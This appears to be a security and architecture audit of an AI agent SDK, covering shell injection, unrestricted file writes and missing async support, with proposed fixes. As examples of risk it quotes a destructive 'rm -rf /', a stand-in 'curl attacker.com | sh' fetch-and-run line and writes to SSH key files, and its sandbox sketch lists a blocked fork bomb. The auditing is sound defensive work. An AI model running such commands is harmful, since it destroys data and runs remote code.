# Deep Analysis: forge-sdk ReactAgent

**Date:** 2026-06-30
**Scope:** 15 files, ~1,800 lines across agents/, tools/, models/, verifiers/, tracing/, audit/, eval/

---

## 1. Per-File Analysis

### 1.1 `agents/react.py` — The Core Loop

**Architecture Flaws**

| Line | Issue | Severity |
|------|-------|----------|
| 57-71 | `__init__` accepts `model: Any, tools: Any` — not typed to `ModelPort` or `ToolRegistry`. This defeats the Protocol at `__init__.py:11`. You can pass a string and it won't fail until runtime. | HIGH |
| 196 | `LoopGuard` is **rebuilt every `arun()` call** (`guard = LoopGuard(max_repeats=self._guard.max_repeats)`), discarding the instance-level guard. This means the guard state never persists across multiple `arun()` calls on the same agent instance — which may be intentional (per-run isolation) but contradicts the constructor parameter. | MEDIUM |
| 203 | `self._model.complete()` is synchronous but called inside `async def arun()`. The model call blocks the event loop. The `ModelPort` protocol defines `complete()` (sync) and `complete_stream()` (sync returning list). There is **no async model port**. This makes the entire agent block on every LLM call, defeating async. | HIGH |
| 314-324 | The `run()` sync wrapper detects a running loop and spawns a thread to run `asyncio.run()`. This is fragile — `asyncio.run` creates a new event loop per call. If called from within a managed event loop (FastAPI, Jupyter), this creates nested loops or `RuntimeError`. The `timeout=120` is hardcoded with no way to override. | MEDIUM |

**Missing Features**

| Line | Missing Feature | What Frontier Frameworks Have |
|------|----------------|------------------------------|
| 194-312 | **No streaming support.** The agent loop calls `self._model.complete()` and waits for the full response. No `complete_stream()` usage, no token-by-token rendering. | LangGraph, CrewAI, AutoGen all stream intermediate thoughts. |
| 137-141 | **No context window management.** Messages grow unboundedly. No token counting, no truncation, no sliding window. After ~20 steps the context will exceed model limits and the API will reject. | LangChain has `ConversationBufferWindowMemory`, `ConversationTokenBufferMemory`. |
| 121-135 | **No parallel tool execution.** Each tool call is sequential (`await tool.handler(**action_input)`). If the model requests 2 independent reads, they run serially. | CrewAI supports `ToolCollection` with parallel dispatch. |
| 194-312 | **No retry/recovery on transient errors.** If `self._model.complete()` raises `RateLimitError` or `ConnectionError`, the entire loop crashes. No exponential backoff. | Instructor, LiteLLM have built-in retry decorators. |
| 105-119 | **No structured output parsing.** `_parse_response` uses regex `find("{")` / `rfind("}")` to extract JSON. This fails on nested braces, arrays in JSON, or responses with explanation text before/after JSON. | Instructor uses Pydantic model with `model_validate_json`, OpenAI uses `response_format: json_schema`. |
| 73-103 | **No tool result caching.** If the model calls `read_file("src/main.py")` twice, it reads from disk twice. No memoization layer. | LangChain has `InMemoryCache`, `SQLiteCache`. |
| 194-312 | **No agent state persistence.** Cannot checkpoint/restore agent state mid-run. If the process dies, all progress is lost. | LangGraph has `CheckpointSaver`, AutoGen has `StateSnapshot`. |
| 54-71 | **No middleware/hook patterns.** No pre/post tool execution hooks, no before/after model call hooks. Cannot inject logging, rate limiting, or guardrails without subclassing. | LangGraph has `callbacks`, CrewAI has `step_callback`. |
| 57-71 | **No dependency injection.** All dependencies (`model`, `tools`, `tracer`, `audit`, `verifier`) are passed in the constructor with no container or factory pattern. | CrewAI has `Agent(llm=..., tools=...)` but with lazy initialization. |

**Code Quality Issues**

| Line | Issue |
|------|-------|
| 16-17 | `import re` and `import hashlib` at module level, but `_ERROR_KEYWORDS` is recompiled inside `_task_implies_edits()` (line 184) on every call. Should be a module-level constant like `_ACTION_VERBS`. |
| 179-192 | `_task_implies_edits()` creates a new `re.compile()` regex object on every invocation. Move `_ERROR_KEYWORDS` to module level. |
| 143-177 | `_extract_edits_from_observation()` uses hardcoded tool name sets (`write_tools`, `shell_tools`). These should be derived from `ToolSpec` metadata, not hardcoded strings. |
| 57 | `model: Any` should be `model: ModelPort` (line 19 already imports types but doesn't enforce). |

**Security Issues**

| Line | Issue |
|------|-------|
| 117 | `json.loads(content[start:end])` — no size limit on parsed JSON. A malicious model response with a 10MB JSON object will be loaded into memory. |
| 131-135 | `_execute_tool` catches all `Exception` and returns the error string to the model. This can leak internal paths, stack traces, or secrets from tool implementations. Error messages should be sanitized. |
| 203 | No timeout on `self._model.complete()`. If the model hangs, the agent hangs forever. |

---

### 1.2 `agents/types.py` — Type Definitions

| Line | Issue | Severity |
|------|-------|----------|
| 20-28 | `AgentContext` is a mutable dataclass with `messages` and `artifacts` as default-mutable fields. Shared references to the same `AgentContext` across concurrent runs would cause data races. | MEDIUM |
| 25 | `max_steps: int = 50` — no validation. Negative values or 0 would cause `range(1, 0)` → empty loop → immediate "max steps" failure. | LOW |
| 59 | `verification: list[Any]` — the comment says `list[VerificationEvidence]` but the actual type is `Any`. This loses type safety. | LOW |

---

### 1.3 `agents/__init__.py` — Agent Protocol

| Line | Issue | Severity |
|------|-------|----------|
| 10-14 | `Agent` protocol only requires `run()`. Missing `arun()` — async-first agents cannot satisfy this protocol. The `ReactAgent` implements both but the protocol doesn't enforce the async path. | MEDIUM |
| 14 | No `__aenter__`/`__aexit__` for resource cleanup (closing model connections, flushing traces). | LOW |

---

### 1.4 `tools/types.py` — ToolSpec and ToolResult

| Line | Issue | Severity |
|------|-------|----------|
| 42-58 | `ToolSpec` is a mutable dataclass but `handler` is a `Callable` — comparing two `ToolSpec` instances for equality will fail on unhashable handler. Registry uses `stable_id` as key, but nothing prevents two `ToolSpec` with the same `stable_id` and different handlers. | LOW |
| 60-62 | `applies(context)` always returns `True` — no actual conditional logic. This is dead code that suggests the feature was planned but never implemented. | LOW |
| 64-73 | `to_prompt_schema()` generates OpenAI function-calling format, but the agent loop in `react.py` doesn't use it — the system prompt manually concatenates tool descriptions. This schema is unused in the core loop. | MEDIUM |
| 55 | `input_schema: dict` — no validation that it's actually valid JSON Schema. | LOW |

---

### 1.5 `tools/registry.py` — ToolRegistry

| Line | Issue | Severity |
|------|-------|----------|
| 22-26 | `get_by_name()` does a linear scan O(n) over all tools. For a registry with hundreds of tools, this is called on every tool invocation. Should maintain a name→stable_id index. | LOW |
| 16-17 | `register()` doesn't check for duplicate `stable_id`. Second registration silently overwrites the first. No warning, no error. | MEDIUM |
| 28-30 | `available()` calls `t.applies(context)` on every call. No caching — the same list is rebuilt on every `available()` call in the agent loop (line 76 of react.py). | LOW |

---

### 1.6 `tools/filesystem.py` — File Tools

| Line | Issue | Severity |
|------|-------|----------|
| 19-45 | `_read_file` reads the entire file into memory. No size limit. A 2GB file will OOM the process. | HIGH |
| 36 | `errors="replace"` silently replaces malformed bytes with `\ufffd`. The model has no idea data was corrupted. Should at least note the replacement in metadata. | MEDIUM |
| 48-66 | `_write_file` creates directories with `mkdir(parents=True, exist_ok=True)` unconditionally. No path validation — the model can write to `/etc/passwd` or `~/.ssh/authorized_keys`. | HIGH |
| 48-66 | **No file locking.** Concurrent writes to the same path (from parallel tool execution, if added) will corrupt data. | MEDIUM |
| 69-98 | `_list_dir` calls `full.stat()` for every entry (line 87). For directories with thousands of files, this is slow. Also, `stat()` can raise on broken symlinks. | MEDIUM |
| 101-189 | `FILE_TOOLS` is defined as a module-level list. If imported twice (different import paths), the handlers are different function objects — stable_id collision but different callables. | LOW |

---

### 1.7 `tools/shell.py` — Shell Tool

| Line | Issue | Severity |
|------|-------|----------|
| 13 | `_shell()` uses `subprocess.run(..., shell=True)`. This is a **shell injection vector**. The model can pass `command: "rm -rf /"` or `command: "curl attacker.com | sh"`. | CRITICAL |
| 13 | `timeout: int = 60` — default is fine, but the schema says "max: 300" (line 95) yet no validation enforces this. Model can pass `timeout: 999999`. | MEDIUM |
| 15-22 | `subprocess.run()` with `shell=True` runs in the host shell. No sandboxing, no seccomp, no container isolation. | CRITICAL |
| 36-43 | Error suggestions are based on `returncode` and stderr substring matching. Fragile — stderr messages vary by OS and locale. | LOW |

**Security Hardening Required:**
- Shell tool should use `subprocess.run(command_list, shell=False)` with explicit argument splitting
- Or wrap in a sandbox (Docker, firejail, nsjail)
- Implement command allowlist/blocklist
- Add `cwd` validation to prevent path traversal

---

### 1.8 `tools/search.py` — Search Tools

| Line | Issue | Severity |
|------|-------|----------|
| 15-53 | `_grep` depends on `rg` (ripgrep) binary. If not installed, returns error. No fallback to Python `re` module. | MEDIUM |
| 21 | `subprocess.run(cmd, ...)` — the `pattern` and `path` arguments are passed directly. Regex injection: a malicious pattern like `.*` will search the entire filesystem. No input sanitization. | MEDIUM |
| 56-80 | `_glob` uses `Path.glob()` which can be slow on large directories. No `max_results` limit — matching 100k files will create a huge output string. | LOW |

---

### 1.9 `models/port.py` — ModelPort Protocol

| Line | Issue | Severity |
|------|-------|----------|
| 10-45 | Protocol is well-designed but missing `async_complete()` and `async_complete_stream()`. The agent loop is `async` but the model port is sync-only, forcing blocking calls. | HIGH |
| 29-36 | `complete()` has no `timeout` parameter. Model calls can hang indefinitely. | MEDIUM |
| 38-45 | `complete_stream()` returns `list[ModelChunk]` — this defeats streaming. Should return `AsyncIterator[ModelChunk]` for true token-by-token streaming. | HIGH |

---

### 1.10 `models/types.py` — ModelResponse

| Line | Issue | Severity |
|------|-------|----------|
| 9-13 | `Usage` has no `cached_tokens` field (for prompt caching, common in Anthropic/OpenAI). | LOW |
| 17-26 | `ModelResponse` is frozen but `raw: dict` is mutable (dict is not frozen). The `raw` dict can be mutated after creation. | LOW |
| 29-35 | `ModelChunk` has `usage: Usage | None` — usage is only available on the final chunk in most APIs. This is correct but undocumented. | LOW |

---

### 1.11 `verifiers/__init__.py` — Verification Pipeline

| Line | Issue | Severity |
|------|-------|----------|
| 105-106 | `SemanticCheck` sanitizes `SYSTEM:` → `SYSTEM_ESCAPED:` in user content. But only checks `SYSTEM:` — what about `SYSTEM\n`, `System:`, or multi-line injection? This is a weak prompt injection defense. | MEDIUM |
| 112-113 | Prompt uses `<<<>>>` delimiters for user content. No escaping of `<<<>>>` within user content. Model can break out of the data boundary. | MEDIUM |
| 125 | `import re` is inside the `execute()` method — re-imported on every call. Should be a module-level import. | LOW |
| 177-202 | `Verifier.verify()` receives `code: str` — it verifies the raw text output, not the actual files on disk. If the agent writes files and then the verifier checks the text, there's a mismatch (the text might not match what was written). | HIGH |
| 213-228 | `_gate_syntactic()` calls `compile(code, "<agent-output>", "exec")`. This only works for Python code. Non-Python output (JSON, markdown, shell scripts) will always fail this gate. | MEDIUM |
| 253-290 | `_gate_entity_validation()` only checks `open()` calls with literal string arguments. It misses: `open(variable)`, `open(f"prefix_{name}")`, `Path(...) / ...`, `os.path.join(...)`. The check is very shallow. | LOW |
| 292-325 | `_gate_shell_dry_run()` runs `python3 -c "import ast; ast.parse(...)"` in a subprocess — this is the same as `_gate_ast_parse()` but in a subprocess. Redundant. | LOW |
| 61-164 | `SemanticCheck` makes an LLM call during verification. This means verification is non-deterministic and adds latency + cost. Should be optional/separate from deterministic gates. | MEDIUM |

---

### 1.12 `tracing/tracer.py` — Tracer

| Line | Issue | Severity |
|------|-------|----------|
| 53-79 | `llm_call()` stores `json.dumps(messages)` in span attributes. Messages can be huge (full conversation history). This bloats trace files. No truncation or sampling. | MEDIUM |
| 104-112 | `export_jsonl()` opens the file, writes all spans, and closes. Not atomic — if the process crashes mid-write, the file is corrupted. Should write to temp file then rename. | MEDIUM |
| 119-124 | `total_tokens` property sums `gen_ai.usage.total_tokens` from span attributes, but `llm_call()` doesn't always set this attribute (it only passes `**usage` if provided). Token counts may be incomplete. | MEDIUM |
| 127-133 | `total_cost_usd` sums `gen_ai.cost_usd` — but nothing in the codebase sets this attribute. Cost tracking is dead code. | LOW |
| 16-22 | `Tracer.__init__` creates `_span_stack` for nesting, but `finish_span()` only pops if the finishing span is the top of stack. If spans finish out of order (e.g., in async code), the stack becomes incorrect. | MEDIUM |

---

### 1.13 `tracing/span.py` — Span

| Line | Issue | Severity |
|------|-------|----------|
| 33-79 | Span is mutable (`@dataclass` without `frozen=True`). Any code can modify span attributes after creation, breaking audit integrity. | LOW |
| 47-49 | `finish()` sets `end_time` to `time.time()`. In distributed systems, this should use monotonic clocks for duration calculation. | LOW |
| 60-79 | `to_dict()` doesn't include `events` if the list is empty (line 74-78). This means the shape of the dict varies — consumers must check for key existence. | LOW |

---

### 1.14 `audit/__init__.py` — Audit Log

| Line | Issue | Severity |
|------|-------|----------|
| 54 | `sqlite3.connect(str(self._db_path))` — no WAL mode, no busy timeout. Concurrent writes from async code will raise `sqlite3.OperationalError: database is locked`. | HIGH |
| 99-111 | `append()` does `INSERT` then `commit()` on every entry. High-volume auditing (every tool call) will be slow. Should batch commits. | MEDIUM |
| 114-129 | `verify_integrity()` reads ALL entries into memory. For millions of entries, this will OOM. Should verify incrementally. | MEDIUM |
| 51-56 | `__init__` creates the database file in `~/.forge/audit.db` by default. No permission restriction on the file. | LOW |
| 172-173 | Re-exports `DaemonEventSink` and `EventSink` at module level — if these import fails (e.g., missing dependency), the entire `audit` module fails to import. | LOW |

---

### 1.15 `eval/harness.py` — Eval Harness

| Line | Issue | Severity |
|------|-------|----------|
| 76-95 | `CodeExtractor` uses `callable` type hint (lowercase) — this is the deprecated form. Should use `collections.abc.Callable`. | LOW |
| 176-215 | `eval_problem()` is synchronous. No parallel evaluation of problems. For 164 HumanEval problems, this is 164 sequential LLM calls. | HIGH |
| 229-236 | `run_benchmark()` uses `print()` for progress output. Should use logging. | LOW |
| 254-273 | `load_humaneval()` catches all exceptions and re-raises as `RuntimeError`. Loses original traceback context (uses `from e` correctly, but the broad catch hides import errors vs dataset errors). | LOW |
| 254-293 | No caching of downloaded datasets. Every `load_humaneval()` call re-downloads from HuggingFace. | MEDIUM |
| 190 | `self._runner.run(code, problem.test_code)` — the `TestRunner` concatenates code + test and runs in a subprocess. No dependency injection for the test environment (e.g., if code needs `numpy`, it must be installed globally). | MEDIUM |

---

## 2. Missing Features Inventory (Prioritized)

### P0 — Critical Gaps

1. **No async model port.** The entire async agent loop is fake — it blocks on sync `complete()` calls. Need `async complete()` in `ModelPort` protocol.

2. **No context window management.** Agent will crash after exceeding model context limits. Need token counting + truncation/summarization strategy.

3. **Shell injection.** `shell=True` with unsanitized model input is a critical security vulnerability.

4. **No retry/backoff.** Transient API errors (rate limits, timeouts) crash the entire agent run.

### P1 — High-Impact Gaps

5. **No streaming.** Users see nothing until the full response arrives. ModelPort has `complete_stream()` returning `list[ModelChunk]` — should be `AsyncIterator[ModelChunk]`.

6. **No parallel tool execution.** Independent tool calls run sequentially.

7. **No tool result caching.** Repeated reads of the same file waste tokens and time.

8. **No structured output with Pydantic.** Regex JSON parsing is fragile.

9. **No checkpointing/state persistence.** Long-running agents lose all progress on crash.

10. **File write without sandbox.** Model can write anywhere on the filesystem.

### P2 — Important Gaps

11. **No middleware/hooks.** No way to inject guardrails, logging, or rate limiting without subclassing.

12. **No file size limits.** Reading a 2GB file OOMs the process.

13. **No eval parallelism.** Benchmark evaluation runs sequentially.

14. **No cost tracking.** `total_cost_usd` is computed from attributes that are never set.

15. **No agent protocol for async.** `Agent` protocol only requires sync `run()`.

---

## 3. Architecture Improvement Proposals

### 3.1 Async-First Model Port

```python
# models/port.py
class ModelPort(Protocol):
    async def async_complete(
        self,
        messages: list[dict],
        *,
        temperature: float = 0.0,
        max_tokens: int | None = None,
        timeout: float = 60.0,
    ) -> ModelResponse: ...

    async def async_complete_stream(
        self,
        messages: list[dict],
        *,
        temperature: float = 0.0,
        max_tokens: int | None = None,
    ) -> AsyncIterator[ModelChunk]: ...
```

The sync `complete()` should be a wrapper that calls `asyncio.run()` internally for backward compatibility.

### 3.2 Context Window Manager

```python
# agents/context.py
class ContextManager:
    """Manages message history to stay within model context limits."""

    def __init__(self, max_tokens: int, tokenizer: Callable[[str], int]):
        self.max_tokens = max_tokens
        self.tokenizer = tokenizer

    def fit(self, messages: list[dict]) -> list[dict]:
        """Truncate/summarize to fit within token budget."""
        total = sum(self.tokenizer(m["content"]) for m in messages)
        if total <= self.max_tokens:
            return messages

        # Strategy: keep system prompt + last N messages
        # Fall back to summarization if still too long
        ...
```

### 3.3 Middleware Pipeline

```python
# agents/middleware.py
class AgentMiddleware(Protocol):
    async def before_tool(self, tool_name: str, tool_input: dict) -> dict | None:
        """Return modified input, or None to block execution."""
        ...

    async def after_tool(self, tool_name: str, result: ToolResult) -> ToolResult:
        """Modify or log the result."""
        ...

    async def before_model(self, messages: list[dict]) -> list[dict]:
        """Modify messages before model call."""
        ...

class ReactAgent:
    def __init__(self, ..., middleware: list[AgentMiddleware] | None = None):
        self._middleware = middleware or []
```

### 3.4 Sandboxed Shell Tool

```python
# tools/shell.py
class SandboxedShell:
    """Shell execution with command filtering and sandboxing."""

    BLOCKED_COMMANDS = {"rm -rf", "mkfs", ":(){ :|:& };:"}
    ALLOWED_PREFIXES = {"git", "ls", "cat", "head", "tail", "grep", "find"}

    async def execute(self, command: str, cwd: str, timeout: int = 60) -> ToolResult:
        # 1. Check blocklist
        for blocked in self.BLOCKED_COMMANDS:
            if blocked in command:
                return ToolResult(success=False, error=f"Blocked command: {blocked}")

        # 2. Use shlex.split + subprocess.run(shell=False)
        args = shlex.split(command)
        result = subprocess.run(args, shell=False, ...)
```

### 3.5 Checkpointing

```python
# agents/checkpoint.py
class AgentCheckpoint:
    """Serializable agent state for crash recovery."""

    def save(self, state: AgentState, path: Path) -> None:
        with open(path, "w") as f:
            json.dump({
                "messages": state.messages,
                "step": state.step_count,
                "edits": state.edits,
                "guard_state": state.guard_counts,
            }, f)

    def load(self, path: Path) -> AgentState:
        ...
```

---

## 4. Security Hardening Items

| Priority | Item | File | Fix |
|----------|------|------|-----|
| **P0** | Shell injection via `shell=True` | `shell.py:13` | Use `subprocess.run(shlex.split(cmd), shell=False)` + command blocklist |
| **P0** | Unrestricted file write | `filesystem.py:48` | Add path allowlist (project root only), block `/etc`, `~/.ssh`, etc. |
| **P0** | No file size limits | `filesystem.py:19` | Add `MAX_FILE_SIZE = 10_000_000` (10MB) before `read_text()` |
| **P1** | Error message leaking | `react.py:134-135` | Sanitize exception messages before returning to model |
| **P1** | Unvalidated JSON parsing | `react.py:117` | Add size limit on JSON input, use Pydantic for validation |
| **P1** | Regex injection in grep | `search.py:20` | Validate pattern with `re.compile()` before passing to `rg` |
| **P1** | Prompt injection in verifier | `verifiers/__init__.py:105-113` | Use XML tags with escaping, not fragile delimiter matching |
| **P2** | SQLite concurrent writes | `audit/__init__.py:54` | Enable WAL mode + busy timeout: `conn.execute("PRAGMA journal_mode=WAL")` |
| **P2** | Mutable audit spans | `span.py:33` | Make Span frozen or add immutable audit copy |
| **P2** | No path traversal check | `filesystem.py:50` | Resolve path and verify it's within allowed root |

---

## 5. Summary: Top 10 Most Impactful Issues

| # | Issue | Impact | Effort |
|---|-------|--------|--------|
| 1 | Fake async (sync model calls in async loop) | Performance, scalability | High |
| 2 | No context window management | Crash on long runs | Medium |
| 3 | Shell injection (`shell=True`) | Security | Low |
| 4 | No file write sandboxing | Security | Low |
| 5 | No retry/backoff on API calls | Reliability | Low |
| 6 | No streaming support | UX, perceived latency | Medium |
| 7 | No structured output (Pydantic parsing) | Reliability, correctness | Medium |
| 8 | Unbounded file reads (OOM) | Reliability | Low |
| 9 | No parallel tool execution | Performance | Medium |
| 10 | No checkpointing | Reliability | High |
